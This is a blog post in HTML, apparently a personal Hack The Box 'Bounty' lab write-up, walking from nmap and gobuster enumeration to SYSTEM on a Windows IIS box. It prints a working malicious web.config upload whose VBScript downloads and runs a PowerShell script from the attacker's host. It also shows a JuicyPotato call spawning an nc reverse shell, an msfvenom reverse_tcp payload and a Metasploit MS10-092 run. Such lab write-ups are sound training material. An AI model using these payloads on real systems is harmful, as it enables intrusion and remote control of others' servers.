@@ -1,0 +1,208 @@
+<!DOCTYPE html>  
+<html lang="en"><link rel="stylesheet" href="../../css/style.css" type="text/css" media="all" />  
+
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Bounty Writeup &middot; Gabe Roberts Blog">
+<meta property="og:description" content="HTB &amp;amp;ldquo;Bounty&amp;amp;rdquo; Writeup This was a windows box that taught me some new techniques and refreshed some old ones.
+Enumeration Started out with nmap and found only 80 open indicating a webserver.
+1# Nmap 7.94 scan initiated Sat Aug 26 12:43:21 2023 as: nmap -sC -sV -vv -oA bounty 10.10.10.93 2Nmap scan report for 10.10.10.93 3Host is up, received syn-ack (0.041s latency). 4Scanned at 2023-08-26 12:43:21 EDT for 16s 5Not shown: 999 filtered tcp ports (no-response) 6PORT STATE SERVICE REASON VERSION 780/tcp open http syn-ack Microsoft IIS httpd 7.">
+<meta property="og:url" content="https://contactroberts.com/blog/08-28-2023_htb_bounty/">
+<meta property="og:site_name" content="Gabe Roberts Blog">
+<meta property="og:image" content="">
+<meta property="og:image:secure_url" content="">
+
+
+
+<meta property="article:published_time" content="2023-08-28T00:00:00Z">
+
+<body><header>  
+    <nav class="navbar" role="navigation">  
+        <div class="navbar__left">  
+            <a href="../../">Gabe Roberts</a>  
+        </div>  
+        <div class="">  
+            <a href="../../blog">Blogs</a>  
+            <span class ="nav-item navbar-text mx-1">&emsp;/&emsp;</span>
+            <a href="../../tags/">Tags</a>  
+            <span class ="nav-item navbar-text mx-1">&emsp;/&emsp;</span>
+            <a href="../../pages/">Other</a>  
+        </div>  
+    </nav>  
+</header>  
+<main>  
+<section class="section">  
+  <article>  
+    <div class="blog__container">  
+          <h1 class="blog__title">HTB Bounty Writeup</h1>  
+
+          <p> Good, Old Fashioned, Windows. </p>
+          <p>Published: August 28, 2023</p>
+          <p>Reading Time: 4  minutes <p>
+
+            <div class="blog__details">  
+              <div class="blog__info">  
+              </div>  
+            </div>  
+          <div class="content">  
+            <h1 id="htb-bounty-writeup">HTB &ldquo;Bounty&rdquo; Writeup</h1>
+<p>This was a windows box that taught me some new techniques and refreshed some old ones.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Started out with nmap and found only 80 open indicating a webserver.</p>
+<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#928374;font-style:italic"># Nmap 7.94 scan initiated Sat Aug 26 12:43:21 2023 as: nmap -sC -sV -vv -oA bounty 10.10.10.93</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span>Nmap scan report <span style="color:#fe8019">for</span> 10.10.10.93
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Host is up, received syn-ack <span style="color:#fe8019">(</span>0.041s latency<span style="color:#fe8019">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>Scanned at 2023-08-26 12:43:21 EDT <span style="color:#fe8019">for</span> 16s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span>Not shown: <span style="color:#d3869b">999</span> filtered tcp ports <span style="color:#fe8019">(</span>no-response<span style="color:#fe8019">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span>80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span>|_http-title: Bounty
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span>|_http-server-header: Microsoft-IIS/7.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span>| http-methods:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>Browsing to the page indicates only an image of a wizard, named merlin.</p>
+<p>Now I decided to do some dirbusting, since I didn&rsquo;t have a hostname or any other ports.</p>
+<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 1</span><span><span style="color:#fe8019">[</span>~/htb/bounty<span style="color:#fe8019">]</span>$ gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 2</span><span><span style="color:#fe8019">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 3</span><span>Gobuster v3.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 4</span><span>by OJ Reeves <span style="color:#fe8019">(</span>@TheColonial<span style="color:#fe8019">)</span> &amp; Christian Mehlmauer <span style="color:#fe8019">(</span>@firefart<span style="color:#fe8019">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 5</span><span><span style="color:#fe8019">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 6</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Url:                     http://10.10.10.93
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 7</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 8</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Threads:                 <span style="color:#d3869b">10</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59"> 9</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">10</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Negative Status codes:   <span style="color:#d3869b">404</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">11</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> User Agent:              gobuster/3.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">12</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Extensions:              asp,aspx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">13</span><span><span style="color:#fe8019">[</span>+<span style="color:#fe8019">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">14</span><span><span style="color:#fe8019">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">15</span><span>2023/08/28 15:07:51 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">16</span><span><span style="color:#fe8019">===============================================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">17</span><span>/transfer.aspx        <span style="color:#fe8019">(</span>Status: 200<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 941<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">18</span><span>/*checkout*.aspx      <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">19</span><span>/*docroot*.aspx       <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">20</span><span>/*.aspx               <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">21</span><span>/http%3A%2F%2Fwww.aspx <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">22</span><span>/http%3A.aspx         <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">23</span><span>/UploadedFiles        <span style="color:#fe8019">(</span>Status: 301<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 156<span style="color:#fe8019">]</span> <span style="color:#fe8019">[</span>--&gt; http://10.10.10.93/UploadedFiles/<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">24</span><span>/q%26a.aspx           <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">25</span><span>/**http%3a.aspx       <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">26</span><span>/*http%3A.aspx        <span style="color:#fe8019">(</span>Status: 400<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 11<span style="color:#fe8019">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">27</span><span>/uploadedFiles        <span style="color:#fe8019">(</span>Status: 301<span style="color:#fe8019">)</span> <span style="color:#fe8019">[</span>Size: 156<span style="color:#fe8019">]</span> <span style="color:#fe8019">[</span>--&gt; http://10.10.10.93/uploadedFiles/<span style="color:#fe8019">]</span>
+</span></span></code></pre></div><p>This gave us two locations, <code>transfer.aspx</code> which was a file upload and <code>/uploadedfiles</code> which is the directory where we could find our uploaded files.</p>
+<h2 id="footfold">Footfold</h2>
+<p>A quick test reveals that jpg files are allowed, while aspx files are being blocked. I got around the filter using .aspx.jpg but this wouldn&rsquo;t execute. Getting a common list of extensions from burp and testing them out, it looks like .config is allowed.</p>
+<p><img src="attachment/61d09f8523a6a2970890061e04b7e9a3.png" alt=""></p>
+<p>I didn&rsquo;t really know what to do with this though, so I referred to the resourves from the walk through and found out that this is similar to overwriting the .htaccess files on a linux web server to execute code.</p>
+<ul>
+<li><a href="https://github.com/JoshMorrison99/web.config-File-Upload-RCE-C:heck/blob/main/revshell.config">https://github.com/JoshMorrison99/web.config-File-Upload-RCE-C:heck/blob/main/revshell.config</a></li>
+<li><a href="https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/">https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/</a></li>
+</ul>
+<p>I uploaded the following shell:</p>
+<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&#34;Read, Script, Write&#34;&gt;
+         &lt;add name=&#34;web_config&#34; path=&#34;*.config&#34; verb=&#34;*&#34; modules=&#34;IsapiModule&#34; scriptProcessor=&#34;%windir%\system32\inetsrv\asp.dll&#34; resourceType=&#34;Unspecified&#34; requireAccess=&#34;Write&#34; preCondition=&#34;bitness64&#34; /&gt;
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&#34;.config&#34; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&#34;web.config&#34; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;%@ Language=VBScript %&gt;
+&lt;%
+  call Server.CreateObject(&#34;WSCRIPT.SHELL&#34;).Run(&#34;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.19/shell.ps1&#39;)&#34;)
+%&gt;
+</code></pre><p>The shell.ps1 file is the standard nishang one line shell.</p>
+<p>Now we have code execution.</p>
+<h2 id="privesc">Privesc</h2>
+<p>I went to get the flag, but alas, it wasn&rsquo;t there!</p>
+<p>Turns out it was just hidden and could be revealed with some Powershell trickery (it is on my list to learn more powershell).</p>
+<p>Now it was time to do some standard enumeration on the box.</p>
+<p>Getting my users privileges revealed SeImpersonate, which is an indicator a Potato attack may be possible.</p>
+<pre tabindex="0"><code>PS C:\users\merlin\desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre><p>I loaded up my potato, started up my listener, and then I was root.</p>
+<pre tabindex="0"><code>PS C:\users\merlin\desktop&gt; ./JuicyPotato.exe -l 1337 -c &#34;{4991d34b-80a1-4291-83b6-3328366b9097}&#34; -p c:\windows\system32\cmd.exe -a &#34;/c c:\users\merlin\desktop\nc.exe -e cmd.exe 10.10.14.19 7777&#34; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+....
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+</code></pre><p>systeminfo (also the guide when I looked afterwards) revealed that this was a quite out of date version of windows, Windows 2008. We can run the metasploit exploit suggester module after getting a session and seeing what else we find</p>
+<div class="highlight"><pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#756d59">1</span><span>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#fe8019">=</span>10.10.14.19 LPORT<span style="color:#fe8019">=</span><span style="color:#d3869b">5555</span> -f exe &gt; shell.exe
+</span></span></code></pre></div><p>MS10-092 was one of many potential exploits and this one works.</p>
+<pre tabindex="0"><code>msf6 exploit(windows/local/ms10_092_schelevator) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.19:6666
+[*] Running automatic check (&#34;set AutoCheck false&#34; to disable)
+[!] The service is running, but could not be validated.
+[*] Preparing payload at C:\Windows\TEMP\vVygyJpVGdTPU.exe
+[*] Creating task: O0LGFkLqDWzc9
+[*] Reading the task file contents from C:\Windows\system32\tasks\O0LGFkLqDWzc9...
+[*] Original CRC32: 0xd2ff3655
+[*] Final CRC32: 0xd2ff3655
+[*] Writing our modified content back...
+[*] Validating task: O0LGFkLqDWzc9
+[*] Disabling the task...
+[*] SUCCESS: The parameters of scheduled task &#34;O0LGFkLqDWzc9&#34; have been changed.
+[*] Enabling the task...
+[*] SUCCESS: The parameters of scheduled task &#34;O0LGFkLqDWzc9&#34; have been changed.
+[*] Executing the task...
+[*] Sending stage (240 bytes) to 10.10.10.93
+[*] Command shell session 3 opened (10.10.14.19:6666 -&gt; 10.10.10.93:49175) at 2023-08-28 16:04:39 -0400
+[*] Deleting task O0LGFkLqDWzc9...
+
+
+Shell Banner:
+Microsoft Windows [Version 6.1.7600]
+-----
+
+
+C:\Windows\system32&gt;whoami
+whoami
+nt authority\system
+</code></pre><p>I got the flag at this point and got out of there.</p>
+  
+          </div>  
+        </div>  
+
+  </article>  
+
+
+  
+        </main>
+
+<footer>
+  <div class="footer_class">
+    <p>
+    <a href="../../pages/links" title="Reach out to me">Have Questions? Reach out to me.</a>
+    </p>
+
+  </div>
+</footer>
+</body>  
+</html>
+
